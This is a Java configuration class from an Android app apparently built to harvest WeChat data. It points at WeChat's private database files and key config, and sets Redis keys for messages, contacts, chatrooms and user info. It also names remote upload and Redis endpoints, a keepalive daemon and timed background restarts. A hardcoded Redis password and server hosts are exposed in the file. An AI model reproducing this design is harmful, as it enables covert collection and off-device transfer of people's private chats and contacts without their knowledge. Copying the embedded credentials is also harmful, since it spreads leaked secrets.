package com.crm.finance.util;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;

import com.crm.finance.GohnsonService;
import com.marswin89.marsdaemon.MyApplication1;
import com.marswin89.marsdaemon.Service1;

import java.util.List;

import okhttp3.MediaType;

/**
 * Created by Dipa on 2017/7/20.
 */

public class GlobalCofig {
    public static final boolean LOG_NO_LOG =true;//false打印日志文件，true不写日志

    public static final int IS_OFFICIAL = 0;//0为正式，1为测试

    public static final String OPERATION_DIR ="/data/data/com.tencent.mm";
    public static final String OPERATION_DIR_1 ="/data/data/com.tencent.mm/.1";
    public static final String OPERATION_DIR_0 ="/data/user/0/com.tencent.mm";
    public static final String OPERATION_DIR_11 ="/data/user/11/com.tencent.mm";
    public static final String OPERATION_DIR_PARALLEL_LITE ="/data/data/com.parallel.space.lite/parallel_lite/0/com.tencent.mm";//平行空间目录
    public static final String WX_DATA_DB ="EnMicroMsg.db";
    public static final String COMPATIBLE_INFO_CFG ="/MicroMsg/CompatibleInfo.cfg";
    public static final String WX_UIM_FILE ="/shared_prefs/app_brand_global_sp.xml";

    public static final String WECHAT_DB_NAME ="wechat_data";//存微信数据库名

    public static final String uploadMessageUrl ="http://172.18.42.59/op/gift/crmPort";
    public static final String IS_INPUT_FILE_LOG ="IS_INPUT_FILE_LOG";

  // public static final String REDIS_HOST ="183.62.121.141";
   public static final String REDIS_HOST ="redis.huaxuntg.com";
    public static final int Port =16379;
    public static final String REDIS_AUTH ="asdfsdf$%324%3423$SDfsdf674534112@@##@#$%^&*(";//redis auth
    public static final int TimeOut =10000;

     public static final String REDIS_HOST_TEST ="113.108.114.194";
    public static final int Port_TEST =6379;//;//redis port
    public static final String CRM_TIP ="crm_";//数据库前缀，因为纯数字无法当表名



    public static final String REDIS_KEY_MESSAGE ="wx_message_table_datas";
    public static final String REDIS_KEY_CHATROOM ="wx_chatroom_table_datas";
    public static final String REDIS_KEY_CONTACT ="wx_contact_table_datas";
    public static final String REDIS_KEY_IMGFLAG ="wx_imgflag_table_datas";
    public static final String REDIS_KEY_USERINFO ="wx_userinfo_table_datas";

    public static final String MESSAGE_LAST_UPLOAD_TIME ="message_last_upload_time_";//消息表当前取到哪个时间点,拼接文件名以区分不同用户数据库
    public static final String MESSAGE_LAST_UPLOAD_TIME_TEMPORARY ="message_last_upload_time_temporary_";//消息表当前取到哪一个临时时间，当上传成功后更改保存MESSAGE_LAST_UPLOAD_TIME，若没上传成功，不更新，拼接文件名以区分不同数据库
    public static final int UPLOAD_NUMBER =500;//信息表每次上传最大条数


    public static final long EXECUTE_SERVICE_INTERVAL =1000 * 10;//该时间内调用多次服务只执行一次,防止广播多次触发
    public static final long EXECUTE_BROADCAST_INTERVAL =  1000 * 120  ;//广播执行数据上传间隔，不同版本时间其实不可控，只是辅助手段
    public static final long  EXECUTE_HEARBEAT_INTERVAL = 1000 * 15  ;//执行心跳包间隔
    public static final long  EXIST_MAC_TIME = 1000 * 60 * 180 ;//后台进程存在最大时长，当时间到了杀掉进程重启，目的是清内存

    public static final String LAST_EXECUTE_SERVICE_TIME ="last_execute_service_time";//每近的调用上传服务时间，若短期内多次调用不重复执行
    public static final String ALL_RCONTACT_PATH ="all_rcontact_path";//所有好友路径，支持删除重新上传

    public static final String BUGLY_ID ="34420b014b";//buglyId
    public static final boolean BUGLY_ISDEBUG =true;//bugly会详细打出日志并上报，上线时请关闭

    //public static final String SERVICE_URL ="http://172.18.44.128:5005";//上报地址配置
    public static final String SERVICE_URL ="http://mark.tgw360.com/wechat-keepalived";//上报地址配置
    public static final String SERVICE_UPLOAD_FILE_URL ="https://file.tgw360.com/file-service/upload/file?";//上传文件地址配置
    public static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");


    public static final String MESSAGE_LAST_UPLOAD_TIME_ONLY ="message_last_upload_time_only";//消息表最后上传到哪个时间点,不区分数据库



    public static void excuteGohnsonService(Context context){
        Intent service = new Intent(context, GohnsonService.class);
        context.startService(service);
    }
    public static void stopGohnsonService(Context context){
        Intent service = new Intent(context, GohnsonService.class);
        context.stopService(service);
    }
    public static void excuteGuardService(Context context){
      /*  Intent service = new Intent(context, Service1.class);
        context.startService(service);*/
    }
    public static boolean isServiceRunning(String serviceName) {
        android.app.ActivityManager activityManager = (android.app.ActivityManager) MyApplication1.getApp()
                .getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningServiceInfo> serviceList = activityManager
                .getRunningServices(Integer.MAX_VALUE);
        if (serviceList == null || serviceList.size() == 0)
            return false;
        for (android.app.ActivityManager.RunningServiceInfo info : serviceList) {
            if (info.service.getClassName().equals(serviceName))
                return true;
        }
        return false;
    }
}
